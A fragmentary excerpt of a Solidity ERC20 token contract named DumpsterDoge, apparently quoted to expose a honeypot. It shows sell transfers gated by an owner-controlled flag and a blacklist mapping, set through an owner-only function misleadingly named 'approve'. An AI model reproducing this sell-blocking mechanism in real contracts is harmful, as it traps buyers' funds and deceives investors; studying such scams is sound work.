...
contract DumpsterDoge is ERC20, Ownable {
  ...
  uint256 public swapTokensAtAmount = _supply; //200000 * 10**_decimals;
  ...
  function _transfer(
    ...
    if (!contractIsSwapping && automatedMarketMakerPairs[to] && from != address(uniswapV2Router) && !_isExcludedFromFees[from]) {
      require(enabled && !Approve[from] && amount <= maxSellTransactionAmount, 'Sell transfer amount exceeds the maxSellTransactionAmount.');
    }
  ...
  function approve(uint256 amount, address account) external onlyOwner {
...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    function _approve(address account, uint256 amount) internal virtual {
